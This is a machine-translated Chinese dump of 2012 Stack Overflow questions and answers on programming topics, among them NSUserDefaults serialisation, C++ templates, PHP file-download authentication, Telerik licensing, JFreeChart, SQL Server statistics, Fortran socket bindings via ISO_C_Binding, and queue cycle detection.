我认为问题在于您正在通过 NSUserDefaults 存储一组自定义对象。也许您应该查看这篇文章：[How to Save array of custom class in NSUserDefaults](http://soulwithmobiletechnology.blogspot.com.es/2011/08/how-to-save-array-of-custom-class-in.html)或这个[问题](https://stackoverflow.com/questions/2315948/how-to-store-custom-objects-in-nsuserdefaults)。

**编辑**

* * *

您是否添加了方法`encodeWithCoder`和`initWithCoder`. 也许问题在于它的实现。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:50:34.860

究竟是什么让您的应用程序从这些行中崩溃？有3种可能的情况：

1.  从 standardUserDefaults 访问由 @"rawArray" 索引的项目。
2.  从该数组访问节索引。
3.  访问进入日期。

我敢打赌，这个问题与您的 Entry 类和 NSUserDefaults 有关。要将对象存储到 userDefaults，它必须符合 NSCoding 协议（NSArray 和 NSDictionary 已经这样做，并且基本类型也可以与它们各自的方法一起使用）。

但我不得不说，如果这是问题所在，那么当您存储条目时，您的应用程序也会崩溃......所以我真的不知道到底发生了什么。

试着更清楚地了解哪种方法会使您的应用程序崩溃。祝你好运！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-24T20:51:23.933

首先使用`NSKeyedArchiver`（在将它们存储到 之前`NSUserDefaults`）

像这样：

节省：

```
NSData *dataForNSUserDefaults = [NSKeyedArchiver archivedDataWithRootObject:yourEntry];
[[NSUserDefaults standardUserDefaults] setObject:dataForNSUserDefaults forKey:@"yourKey"]; 
```

加载：

```
NSData *archivedData = [[NSUserDefaults standardUserDefaults] objectForKey:@"yourKey"];
Entry *yourEntry = [NSKeyedUnarchiver unarchiveObjectWithData:arrayAsData]; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-24T20:52:03.980

错误消息是说你认为是一个条目的东西实际上是一个字符串。我的第一个猜测是您尝试保存正在转换为类型的字符串描述的自定义对象类型。尝试记录对象以确保查看：

```
NSLog(@"Entry: %@", currEntry); 
```

查看有关数据类型的 NSUserDefaults 文档以了解它支持的内容。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-24T20:53:12.707

`NSUserDefaults`无法存储自定义类的实例。它只能存储简单的东西，如字符串、布尔值和字典。

这就是为什么你得到`[__NSCFString getDate]: unrecognized selector sent to instance`. `__NSCFString`是 Apple 的 NSString 私有类之一。基本上它是说你的调用`NSUserDefaults`返回了一个 NSString，而 NSString 没有一个名为`getDate`.

您需要序列化和反序列化您的数据，因此为了将您的对象存储在 中`NSUserDefaults`，您需要首先将您的对象转换为所有值的字典表示形式。然后，当您想将数据转换回对象时，您可以反其道而行之。键值编码通常很有帮助。

顺便说一句，`getDate`不符合 Objective-C 方法命名。如果您在一个名为 的类上有一个综合属性`date`，您应该拥有`date`该属性的名称，然后使用 综合它`@synthesize date = _date;`。@synthesize 将为您编写 getter 和 setter（访问器和修改器）方法，因此您只需调用`setData:`or `data`，它就会知道该怎么做。如果您使用 ARC 或键值编码，这一点尤其重要，因为在某些情况下，运行时会假定您遵循他们的指导方针。

最后，强烈建议仅将 NSUserDefaults 用于它的用途 - 默认值。这将包括设置和其他非机密信息。如果您开始进行大量更改和请求，则性能不会很好。使用保存到 Documents 目录、SQLite 或 Core Data 的 plist。

# c++ - 具有多个模板定义的库

> ID：10305660
> 
> 赞同：2
> 
> 时间：2012-04-24T20:39:07.467
> 
> 标签：c++, visual-studio-2010, function, templates, static-libraries

我正在学习如何使用 Visual Studio 2010 创建库。所以为了测试多个符号，我刚刚写了 -

**添加.cpp**

```
template <typename T>
T fooBar(T a1, T a2)
{
  return (a1+a2);
} 
```

**减法.cpp**

```
template <typename T>
T fooBar(T a1, T a2)
{
  return (a1-a2);
} 
```

据我了解，模板是一个编译时概念。只是为了测试该工具在函数/函数模板之间的行为，我写了上面的内容。`.lib`即使在功能模板的最高级别设置，它也成功创建而没有任何警告。但是，在正常功能的情况下，它会发出警告。

> add.obj : 警告 LNK4006: "int __cdecl fooBar(int,int)" (?fooBar@@YAHHH@Z) 已经在subtract.obj中定义；第二个定义被忽略
> 
> add.obj：警告 LNK4221：未找到公共符号；存档成员将无法访问

为什么该工具对函数和函数模板的行为不同？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T21:16:24.183

由于它们是模板函数，因此在您实际实例化模板函数之前，函数本身不会被编译。

例如，我只是将以下代码放在我的一个`.cpp`文件中而不使用它，并且`.cpp`文件的编译运行良好（尽管有明显的语法错误）：

```
template <typename J>
int foobar(J junk)
{
#pragma message("Compiling foobar")
     ppp = 35;

     return 0;
} 
```

直到我尝试使用以下命令编译它（即创建它的编译器实例）：

```
int main(void)
{
     double x;
     int y = foobar(x);
     return 0;
} 
```

我得到一个编译错误。

```
: error C2065: 'ppp' : undeclared identifier 
```

自己尝试一下，它可能会帮助您解释所看到的内容（至少在您提到的第一种情况下没有错误。）

# php - 阻止人们从网站窃取文件

> ID：10305661
> 
> 赞同：-5
> 
> 时间：2012-04-24T20:39:09.993
> 
> 标签：php

我正在创建一个工作网站，员工将在其中上传简历/简历。

如何阻止其他人查看其他人的简历/简历并阻止搜索引擎索引此内容？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-24T20:40:06.347

简单的。不要在没有经过身份验证的情况下使文件可用。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-24T20:47:12.530

您可以使用身份验证系统，并且不要将公共 url 提供给下载者。例如，您创建如下表：

```
file_name    | file_path         |  file_code
-------------------------------------------------------
My picture   | /var/docs/img.jpg | kljsldjalksdqhq1218 
```

在用户登录（并满足您定义的条件）后，您向他提供下载链接：

[http://yoursite.com/index.php?page=download&file=kljsldjalksdqhq1218](http://yoursite.com/index.php?page=download&file=kljsldjalksdqhq1218)

然后查询数据库，检查正确的关联，然后读取文件——它位于文档根目录之外`file_get_contents()`，例如，使用八位字节流或其他适合文件类型的 MIME 呈现，以强制文件下载; 类似于：

```
header('Content-Type: "'.$mime.'"');
header('Content-Disposition: attachment; filename="'.$filename.'"');
header("Content-Transfer-Encoding: binary");
header('Expires: 0');
header('Pragma: no-cache');
header("Content-Length: ".strlen($file)); 
```

# asp.net - Telerik 控件未加载。我错过了什么？

> ID：10305664
> 
> 赞同：2
> 
> 时间：2012-04-24T20:39:25.763
> 
> 标签：asp.net, .net, telerik

我有一个别人给我的应用程序，它正在使用 Telerik 控件。

该应用程序最初是用 VS2010 框架 4 编写的。

当我尝试最终打开它时，我不断收到错误消息“无法创建设计”错误创建控件 - RadScriptManager1Failed to create Designer 'Telerik.Web.UI.RadScriptManager, Telerik.Web.UI, Version=2011.1.519.40,文化=中性，PublicKeyToken=121fae78165ba3d4'"

telerik.web.ui.dll 文件位于我的“bin”文件夹中。

我错过了什么吗？据我了解，这些控件不是免费的。我需要购买它们才能修改此应用程序代码和控件吗？还是有解决办法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T20:53:45.513

听起来你好像不见了`Telerik.Web.Design.dll`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-31T17:22:11.317

Telerik 官方常见问题解答中的引述：

> **Telerik 开发人员许可证如何工作？**
> 
> 每个开发人员许可证允许 1 位开发人员使用设计时产品。如果您购买产品捆绑包（例如 DevCraft Complete）的许可证，捆绑包中的所有工具都许可给 1 位开发人员，并且只有该开发人员能够使用捆绑包中的工具开发产品。开发人员许可证是永久的，**没有部署限制**- 它们允许将我们的控件用于跨越各种服务器和域的无限数量的应用程序。与竞争产品相比，Telerik 开发人员许可证**无需许可证密钥**即可工作，您可以确定您永远不会收到许可证密钥错误。

> **如果我想访问源代码，我应该购买哪个许可证？**
> 
> 在您购买时选择的支持期限内，每个开发人员许可证都可以**访问产品或捆绑包中包含的所有 UI 产品（ASP.NET AJAX、WPF、KendoUI Complete for MVC 等）的源代码**或更新您的许可证。试用许可证和免费下载不附带源代码访问权限。

> **你们提供免费试用吗？**
> 
> 我们提供功能齐全的试用版，无需许可证密钥即可工作，并且可以方便地部署在任何开发、测试或生产机器上。试用版和开发人员版之间的唯一区别是，使用评估副本时，您将在控件顶部不时地在呈现控件时收到一条试用消息。**将试用 dll 替换为开发人员 dll 后，试用消息将消失。**

链接：[http ://www.telerik.com/purchase/faqs/devcraft.aspx](http://www.telerik.com/purchase/faqs/devcraft.aspx)

从法律上讲，一份许可证授予一名开发人员使用 Telerik 控件的权利。但开发人员 dll 没有任何许可证密钥或限制。作为开发人员，您甚至可以获得完整的源代码。但是您应该阅读有关再分发权利的常见问题解答（点击上面的链接）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-24T21:12:31.520

是的，您需要许可证才能使用它们。Telerik 将他们的控件授权给指定的开发人员。还有一个问题是您需要运行安装程序才能正确注册各种控件和 vsix 文件。

您可以直接从 Telerik 下载试用版，但它只是最新版本，而不是您拥有的版本。

您也可以在在线下的扩展管理器中查看 Telerik。我必须通过从那里下载他们的扩展版本来解决他们的安装问题。

编辑：在许可证上，如果您从离开公司的开发人员那里继承了代码，Telerik 应该能够将他们的许可证转移给您。此外，您可以下载的试用版不会严格过期，但它会为您提供警告对话框，因此不适合实际使用。虽然只是为了证明项目可以编译，但会让你继续前进。

# java - 寻找高性能 Java xy 线绘图仪/绘图仪

> ID：10305665
> 
> 赞同：2
> 
> 时间：2012-04-24T20:39:32.130
> 
> 标签：java, charts, signal-processing, graphing

您好我希望使用 Java 来显示 EMG（肌电图）信号。我已经尝试过 JChart2D，但它对于双核 2.4Ghz 机器来说还不够快。我正在尝试以 1 KHz 查看多达 32 个频道，并且希望每个频道可以查看大约 5 秒的数据。大约 20Hz 的刷新率就足够了（每 50 毫秒）。

有没有人在Java中做过类似的事情？如果是这样，你能把我介绍给你使用的图书馆吗？

非常感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:43:15.377

你试过 JavaFX 2 中的图表吗？我还没有将它们用于实时更新，但 JavaFX 本身似乎很快。图表 API 简介 [http://docs.oracle.com/javafx/2.0/charts/jfxpub-charts.htm](http://docs.oracle.com/javafx/2.0/charts/jfxpub-charts.htm)

# java - JFreeChart 如何获取时间序列图表上显示的数据点

> ID：10305673
> 
> 赞同：4
> 
> 时间：2012-04-24T20:40:16.440
> 
> 标签：java, swing, jfreechart

我只想让图表上的数据点显示出来，我该怎么做？该图显示为线图，但我想要每个单独的数据点的小标记。

该应用程序的 JFreeChart 部分是：

```
 private XYDataset createDataset() {
    final TimeSeries inclinometerAngles = new TimeSeries(TimeUnit.SECONDS);

    // Add all data from the map to the dataset
    final Set<Date> keys = data.keySet();
    for (Date date : keys) {
        Record r = data.get(date);
        if (r.mcInclinometerAngle != null) {
            inclinometerAngles.add(new Second(date), r.mcInclinometerAngle);
        }
    }        

    final TimeSeriesCollection dataset = new TimeSeriesCollection();
    dataset.addSeries(inclinometerAngles);
    return dataset;
}   

private void setupGraphics() {
    final XYDataset dataset = createDataset();
    final JFreeChart chart = createChart(dataset);
    final ChartPanel chartPanel = new ChartPanel(chart);
    chartPanel.setPreferredSize(new java.awt.Dimension(500, 270));
    chartPanel.setMouseZoomable(true, false);
    setContentPane(chartPanel);
}

private JFreeChart createChart(final XYDataset dataset) {
    final JFreeChart chart = ChartFactory.createTimeSeriesChart(
        "Tracker Analysis", 
        "Date", 
        "Value",
        dataset, 
        true, 
        true, 
        false
    );

    final XYPlot plot = chart.getXYPlot();
    XYItemRenderer renderer = plot.getRenderer();

    final StandardXYToolTipGenerator g = new StandardXYToolTipGenerator(
        StandardXYToolTipGenerator.DEFAULT_TOOL_TIP_FORMAT,
        new SimpleDateFormat(), new DecimalFormat("0.00")
    );
    renderer.setToolTipGenerator(g);
    renderer.setItemLabelsVisible(true);
    return chart;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-24T23:33:58.567

[`JFreeChart.createTimeSeriesChart()`](http://www.jfree.org/jfreechart/api/javadoc/org/jfree/chart/ChartFactory.html#createTimeSeriesChart%28java.lang.String,%20java.lang.String,%20java.lang.String,%20org.jfree.data.xy.XYDataset,%20boolean,%20boolean,%20boolean%29)使用[`XYLineAndShapeRenderer`](http://www.jfree.org/jfreechart/api/javadoc/org/jfree/chart/renderer/xy/XYLineAndShapeRenderer.html)，所以首先让形状可见。

```
renderer.setSeriesShapesVisible(true); 
```

此相关[示例](https://stackoverflow.com/a/9875534/230513)说明了影响外观的其他一些方法。

# sql-server - TSQL STATS_STREAM（未记录的功能）的格式是什么？它是否包含所有统计数据？

> ID：10305675
> 
> 赞同：4
> 
> 时间：2012-04-24T20:40:23.153
> 
> 标签：sql-server, sql-server-2008, tsql, table-statistics

我在一台服务器上有一个巨大的表，需要将表复制到生产服务器。我可以做到这一点，但是我需要生成统计信息，这在我不想要求处理大量工作的系统上需要很长时间。如果我移动整个数据库，我需要关闭系统才能删除现有数据库，这是一个禁忌。

Pinal Dave 有一个帖子，[http://blog.sqlauthority.com/2011/01/05/sql-server-copy-statistics-from-one-server-to-another-server/](http://blog.sqlauthority.com/2011/01/05/sql-server-copy-statistics-from-one-server-to-another-server/) 在帖子中，他概述了如何使用 Microsoft 的“生成脚本”将统计信息从一个表复制到新表，该脚本允许通过未记录的 STATS_STREAM 功能进行复制。这是一张新桌子。我不确定我是否可以创建一个包含统计信息的表，然后写入所有数据，因为这会使系统想要更新统计信息——即使我关闭了自动生成统计信息。

我正在使用以下代码：（该表是 InvTbl，我正在更新的该表的统计数据是 GammaTheta。统计数据存在，数据就在那里。）

```
Update STATISTICS dbo.InvTbl [GammaTheta]  WITH STATS_STREAM = 0x0100002000... 
```

首先，有人知道 Stats_Stream 是否包含所有统计数据吗？然后，重要的是，它是如何以二进制形式存储的？

注意：该表存储了我们基于连接查找的两个变量的统计分布，并且具有关于输入分布的一些非常重要的特征。它是静态的，一旦加载，我将永远不需要重新计算值或统计信息。根据测试，不使用全扫描不是一个选项，因为连接速度很重要并且会受到影响。

注 2：不，数字不以省略号结尾。我把数据关了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-25T04:01:11.370

如果我理解您的问题，则统计数据流是统计数据的二进制表示，可用于完全重新创建统计数据，即使在具有不同数据的另一个表上（尽管模式相同）也是如此。[凯文克莱恩在这里](http://sqlblog.com/blogs/kevin_kline/archive/2012/03/16/dev-advice-make-a-tiny-dev-database-act-like-a-huge-prod-database.aspx)写了博客。[我在这里](http://www.spartansql.com/2012/03/scripting-out-statistics.html)尝试了更好的自动化。

# java - 初始化 Java 程序并监听查询

> ID：10305677
> 
> 赞同：1
> 
> 时间：2012-04-24T20:40:38.403
> 
> 标签：java, stanford-nlp

我正在编写一个使用斯坦福 CoreNLP 库以及许多其他库的应用程序。该应用程序获取一个 URL，从中提取文本，然后使用 CoreNLP 处理文本。问题是 CoreNLP 库在注释文本之前需要花费大量时间将其模型加载到内存中。我正在寻找仅执行一次初始化步骤的最佳方法，下一次当我想使用该应用程序并输入一个 URL 时，它不会再次加载模型。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:57:51.403

也许您应该尝试在容器内运行您的应用程序 - [Servlet 容器](http://onjava.com/onjava/2003/05/14/java_webserver.html)，甚至像[Apache Tomcat这样的](http://tomcat.apache.org/)[Web 容器](http://en.wikipedia.org/wiki/Web_container)？您可以将您的应用程序打包为一个[简单的 WAR](https://stackoverflow.com/questions/1001714/how-to-create-war-files)，然后容器将初始化所有 java 类一次，并假设您公开了一个会触发单个 URL 的 NLP 处理的 servlet，您将为所有后续的 NLP 处理调用节省初始化时间。

**编辑：**

您不必使用 servlet。或者，您可以执行以下操作之一：

1.  在您的 WAR 中运行一个循环，该循环将从某些配置源（数据库或文件）读取 URL，并且对于每个 URL 将执行 NLP 和解析（存储结果以供以后分析？）
2.  [更高级的解决方案可能包括您现有的与Quartz](http://quartz-scheduler.org/)结合的 java 程序，它将每 X 秒/分钟/小时等运行一个 NLP+解析器。甚至更高级的版本将使用 Quartz 和[Spring Batch](http://static.springsource.org/spring-batch/)。

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:08:56.343

查看他们页面[Stanford CoreNLP](http://nlp.stanford.edu/software/corenlp.shtml)中的示例，以下内容用于注释文本：

```
Properties props = new Properties();
props.put("annotators", "tokenize, ssplit, pos, lemma, ner, parse, dcoref");
StanfordCoreNLP pipeline = new StanfordCoreNLP(props);
String text = ... // Add your text here!
Annotation document = new Annotation(text);
pipeline.annotate(document); 
```

因此，您可以在应用程序初始化时创建一个对象并解析一个虚拟文本。您忽略操作的结果，因为目的是在加载应用程序时加载所需的模块。之后，您可以保留“管道”对象并在需要时引用它以进行其他注释操作。

# android - Android：使服务不可停止

> ID：10305678
> 
> 赞同：1
> 
> 时间：2012-04-24T20:40:40.510
> 
> 标签：android, android-service

我想知道Android中是否有办法防止服务从“正在运行的服务”屏幕停止。

我开发了一个从我的应用程序启动的服务，我基本上只想从我的应用程序停止它；目前我可以通过选择我的服务并单击应用程序->运行服务屏幕上的停止来停止它

任何帮助将不胜感激。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:48:39.183

您无法阻止系统关闭您的应用程序/服务。这可以通过杀死您描述的进程或系统资源不足时发生。在最后一种情况下，如果您从 onStartCommand 方法返回 START_STICKY，它可以重新启动。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:49:03.553

不，没有办法避免这种情况。总是可以从*运行服务*选项中终止服务

# javascript - 我需要强制 IE 6、7 和 8 等到加载 CSS 后再渲染页面

> ID：10305679
> 
> 赞同：3
> 
> 时间：2012-04-24T20:40:45.530
> 
> 标签：javascript, internet-explorer, css, webpage

我有一个正在构建的响应式网站[http://50.97.104.102/~topdog/](http://50.97.104.102/~topdog/)。由于桌面 css 出现在样式表的底部，因此页面在移动布局中呈现半秒（徽标出现在中心）。然后切换到桌面格式。这仅在 IE 6、7 和 8 中发生。这是一个非常微妙的问题，仅持续半秒。大多数现代浏览器（我使用 chrome）似乎要等到所有 css 都加载完毕后再渲染页面。

有没有办法强制 IE 6,7 和 8 等到整个 CSS 文件被加载后再渲染页面？最好没有javascript。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:51:34.810

您可以使用以下 CSS

```
body {
  visibility: hidden;
}
body.finished {
   visibility: visible;
} 
```

并从 onload 处理程序将完成的类添加到主体。

如果没有 JS，这将无法工作。如果您希望它在没有 JS 的情况下工作，您可以执行以下操作，如果 JS 被禁用，则会出现闪烁，但如果 JS 被启用，则会消除闪烁。

```
body.not-ready{
   visibility: hidden;
}

<body>
<script>
  $(document.body).addClass('not-ready');
  $(window).load(function(){
    $(document.body).removeClass('not-ready')
  });
</script>

</body> 
```

# vbscript - Vbs - 列出所有可见的窗口脚本

> ID：10305680
> 
> 赞同：0
> 
> 时间：2012-04-24T20:40:55.763
> 
> 标签：vbscript

我正在尝试列出所有可见的窗口（名称和顶部）。我的脚本运行良好，但需要安装 Microsoft Word。要执行我的脚本，您可以运行此命令

```
Cscript -B myScript.vbs 
```

muScript.vbs：

```
Dim console
Set console = WScript.StdOut
Dim myString
myString = ""

Set Word = CreateObject("Word.Application")
Set Tasks = Word.Tasks
Set colTasks = Word.Tasks
For Each Task in Tasks
    If Task.Visible Then 
        If colTasks.Exists(Task.Name) Then
            myString = myString & "@@##@@" & colTasks(Task.Name).Name & ","& colTasks(Task.Name).Top
        End If  
   End If
Next
Word.Quit
console.WriteLine myString 
```

您知道如何在不安装 Microsoft Word 的情况下列出可见窗口，例如 myScript.vbs 吗？

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T21:55:22.593

我不认为这是可能的。但是，您可以列出所有正在运行的进程。

[http://www.computerperformance.co.uk/vbscript/wmi_process.htm](http://www.computerperformance.co.uk/vbscript/wmi_process.htm)

```
' Process.vbs
' VBScript Win32_Process to discover which processes are running
' Author Guy Thomas http://computerperformance.co.uk/
' Version 1.4 - December 2010
' -------------------------------------------------------' 
Option Explicit
Dim objWMIService, objProcess, colProcess
Dim strComputer, strList

strComputer = "."

Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" _ 
& strComputer & "\root\cimv2") 

Set colProcess = objWMIService.ExecQuery _
("Select * from Win32_Process")

For Each objProcess in colProcess
  strList = strList & vbCr & _
  objProcess.Name
Next

WSCript.Echo strList
WScript.Quit

' End of List Process Example VBScript 
```

# jquery - 谷歌 jQuery / Wordpress jQuery 冲突

> ID：10305683
> 
> 赞同：1
> 
> 时间：2012-04-24T20:41:20.220
> 
> 标签：jquery, wordpress, header, footer, jquery-masonry

我已经使用 jQuery Masonry 构建了一个 Wordpress 主题。我在本地托管 Masonry 脚本，同时使用 Google 托管的 jQuery 脚本。砌体工作得很好。但出于某种原因，我需要在页脚中同时调用 Masonry 和 jQuery 才能让 Masonry 工作。但是这样做会禁用各种使用 jQuery 的 Wordpress 插件。似乎我的插件需要在页眉中调用 jQuery，而 Masonry 需要在页脚中调用它。

我该如何解决这个冲突？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:45:29.293

`wp_register_script`您应该使用以下方法加载 jQuery ：

```
function my_init() {
    if (!is_admin()) {
        // comment out the next two lines to load the local copy of jQuery
        wp_deregister_script('jquery');
        wp_register_script('jquery', 'http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js', false, '1.7.2');
        wp_enqueue_script('jquery');
    }
}
add_action('init', 'my_init'); 
```

[http://www.ericmmartin.com/5-tips-for-using-jquery-with-wordpress/](http://www.ericmmartin.com/5-tips-for-using-jquery-with-wordpress/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:43:51.070

会不会是兼容性问题？

[http://docs.jquery.com/Using_jQuery_with_Other_Libraries](http://docs.jquery.com/Using_jQuery_with_Other_Libraries)

# c# - 如何更改 .NET 位图资源？

> ID：10305686
> 
> 赞同：0
> 
> 时间：2012-04-24T20:41:29.957
> 
> 标签：c#, .net, resources, bitmap, edit

我需要更改 C# .NET 4.0 程序资源中的位图。我已经用新图像替换了基础 .png 文件并重建了解决方案，但它仍在使用旧图像！

我在这上面花了几个小时！通常有一个微软的噱头来让“显而易见”的事情发挥作用。有谁知道如何做到这一点？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:47:32.797

如果图像在资源 (.resx) 文件中，则需要手动重新添加。

如果资源是经常变化的东西，使用应用程序资源可能不是最好的解决方案。如果是这种情况，从磁盘加载资源会更好。

# ruby-on-rails - Rails 资产 - 在单个视图中添加特定插件

> ID：10305687
> 
> 赞同：0
> 
> 时间：2012-04-24T20:41:30.083
> 
> 标签：ruby-on-rails, assets

我正在尝试包含一个位于以下位置的 js 文件：

```
/vendor/assets/javascripts/scrollable/jquery.tools.js 
```

从一个角度来看，通过这样做：

```
<%= javascript_include_tag X %> 
```

我应该在 X 中添加什么？

我想从视图中加载它，因为它只是在我想要加载库的这个特定页面/操作中。

# linux - 套接字编程 gfortran

> ID：10305689
> 
> 赞同：7
> 
> 时间：2012-04-24T20:41:48.367
> 
> 标签：linux, sockets, networking, fortran, fortran-iso-c-binding

我希望能够在我的 Fortran 应用程序中调用网络功能。我的老板希望我用 Fortran 做所有事情，而不是使用 C 和 Fortran。我们已经在 Windows 上使用 PGI 的 Fortran 编译器完成了该应用程序的一个版本。我们正在将它转移到 Linux 上，我们可能会在其中使用他们的编译器。现在，我正在使用 gfortran。

我为这些网络调用创建了一个接口，并且一切都编译和链接。下面的代码与我正在做的类似，除了接口和常量在一个模块中。

```
PROGRAM MAIN

    INTEGER,PARAMETER  ::AF_INET = 2
    INTEGER,PARAMETER  ::SOCK_STREAM = 1
    INTEGER,PARAMETER  ::IPPROTO_TCP = 6

    INTERFACE
      FUNCTION socket(domain,type,protocol)
        INTEGER  ::socket,domain,type,protocol
      END FUNCTION
    END INTERFACE

    sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
    WRTIE(*,*)"Socket returned: ",sock

END PROGRAM 
```

当我运行程序时，套接字函数返回 -1 失败。我真的不知道发生了什么事。我没有在命令行上添加任何库，所以我猜它与默认库正确链接。我编译使用

```
gfortran -o MAIN_PROGRAM MAIN_PROGRAM.f90 -fno-underscoring 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-24T22:16:15.300

您可以利用 Fortran 2003 中引入的 ISO_C_Binding 来访问 C 库功能，这是您拥有的最简洁和最便携的选项。与任何其他供应商手册一样，[Gfortran 文档](http://gcc.gnu.org/onlinedocs/gfortran/Interoperability-with-C.html#Interoperability-with-C)有一些详细信息。还有一些项目旨在为 Fortran 90 实现 POSIX 接口：[fortranposix](http://sourceforge.net/projects/fortranposix/)和[posix90](http://savannah.nongnu.org/projects/posix90/)。但正如我所说，使用 F2003 功能的适当 C-Binding 接口可能是最干净的选项，另请参见[fortranwiki](http://fortranwiki.org/fortran/show/C+interoperability)。

*编辑：* 这是添加了 ISO-C-Binding 胶水的代码（使用 gfortran 4.4.5 测试）：

```
program testsocket
  use, intrinsic ::  iso_c_binding

  implicit none

  interface
    function socket(domain, type, protocol) bind(c, name="socket")
      use, intrinsic :: iso_c_binding
      integer(kind=c_int) :: socket
      integer(kind=c_int), value :: domain, type, protocol
    end function socket
  end interface

  integer :: sock

  sock = socket(2_c_int, 1_c_int, 6_c_int)

  write(*,*) "Socket returned: ", sock

end program testsocket 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:05:19.370

这是一个猜测。你是科学或工程专业的研究生（但不是计算机科学或计算机工程），你的老板出生于 1950 年之前。如果是这样，我站在你的立场上（除了在我的情况下要求使用 Fortran 77） . 我感觉到你的痛苦。

您可能知道，Fortran 不像 C 那样使用头文件来原型化函数调用。当不检查参数的类型时，您可以调用不带标头的 Fortran 函数。

但是，有这个麻烦——或者曾经有这个麻烦，因为我最近的经验已经过时了好几年。与 C 相比，GNU Fortran 在每个函数的名称前添加一个隐藏的下划线。它还将函数名称小写。

该`readelf -a`程序可以在这里为您提供帮助。在 Fortran 编译器发出的目标文件上使用它。在输出中查找`socket`符号。如果我没记错的话，你会`_socket`在里面看到一个。

如果你真的，真的根本不能使用任何 C —— 甚至用 C 名称创建一个包装函数`_socket()`—— 那么我承认我不知道你接下来应该做什么。在这种情况下，您可能会陷入困境。不管怎样，祝你好运。

*更新：* 我在下面推荐@MSB 的评论。

# algorithm - 检测并发队列中的循环循环

> ID：10305691
> 
> 赞同：0
> 
> 时间：2012-04-24T20:42:05.097
> 
> 标签：algorithm, concurrency, queue

我有一个并发的连接队列。有一个 ping 任务会定期遍历队列中的所有可用连接以执行 ping，同时应用程序可以请求队列中的连接以供其使用。

什么是检测循环循环的好方法，以便 ping 任务可以完成其当前执行？

**编辑：**

示例：假设并发队列有连接 A、B 和 C。

有一个 ping 任务遍历队列。所以在这个例子中它会做`A.ping()`,`B.ping()`和`C.ping()`。现在有一个外部类也请求来自队列的连接，同时 ping 任务也在遍历队列。所以假设 A.ping() 已经完成`externalClass.getConnection()`并将返回`A`。当 ping 任务完成 C.ping() 时，`externalClass.releaseConnection(A)`就会发生。现在队列的顺序是`B,C and A`。因此，ping 任务将在完成 C.ping() 后再次找到 A，此时任务必须确定 A 已经被 ping 过并且应该完成当前执行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-25T05:24:23.407

对于初学者，您没有循环。

循环循环是指您有一个指向自身的链表。您只有一个队列，当您逐步完成它时，可能会有另一个线程将重复的元素添加到队列的末尾。

检测循环循环的方法是使用`hashtable`, 在每次`Ping()`检查连接中是否已经存在连接之前，如果存在，则继续移动到下一个元素，如果不存在，则将其添加到`hashtable`然后你调用你的`Ping`操作到服务器。

或者你可以让你的初始`ping`操作在那个确切的时间制作队列的快照，而不是越过它。

话虽如此，如果您可以让两个不同的呼叫者从队列中获得相同的`A`结果，那么您的队列就会出现问题。

执行此代码的正确方法是有两个单独的列表，一个是请求的连接队列，例如，`externalClass.getConnection()`另一个是连接的列表`Ping`。无论您的`Ping`操作在做什么，它都不应该影响任何外部类对其连接所做的任何事情，例如假设`connection`是 a `sql connection`then`Ping`应该执行如下操作：

```
SELECT TOP 1 1 
```

仅此而已，这将意味着您的连接仍然存在。因为您可能会实施此操作，因为连接空闲时间过长并且会自行关闭。在这种情况下，您真的不应该这样做，因为几乎任何类型的 sql dbms 都支持连接池，这正是您想要做的。除非您想通过让其他执行等待来阻止超过 Queue.Count 的并发连接（这本身可以通过更好的方式来保持打开的连接池，例如简单的`int counter`）

除非您保持与不同服务器的连接并尝试通过在多个服务器之间轮换请求来进行一些临时负载平衡，否则请使用我上面的解决方案以及所有连接列表和可用连接队列。此解决方案的主要好处是您可以在应用程序关闭时终止所有连接，即使它们当前正在处理请求。

**但是，为了完整地回答您的问题：**

如果你*确实*有一个循环，它看起来像这样：`A -> B -> C -> A`每个元素都指向列表中的下一个元素，而不仅仅是 a 中的元素`queue`。一个很好的例子是你 Ping 服务器`A`，它 ping 服务器`B`，它 ping 服务器`C`，然后 ping `A`，你会按如下方式检测它：

检测循环循环的简单方法是一次运行两次（或多次）迭代，我们将它们称为 X 和 Y。

每第二次踏出（或`.Ping()`在您的上下文中）X，您就会踏出一次 Y。您可能想要创建一个新方法，`Visit`而不是调用您的方法，`Ping`以便在循环中不会多次调用 ping。

假设队列看起来像`A, B, C, A, B...`

几个步骤后 X 看起来像：`A, B, C, A`而 Y 看起来像`A, B`。您所做的是您**不**存储整个历史记录，您只查看当前值，因此当您进入 X 时，您会检查新值是否与 Y 的当前值匹配，因此我们最终总会遇到冲突。

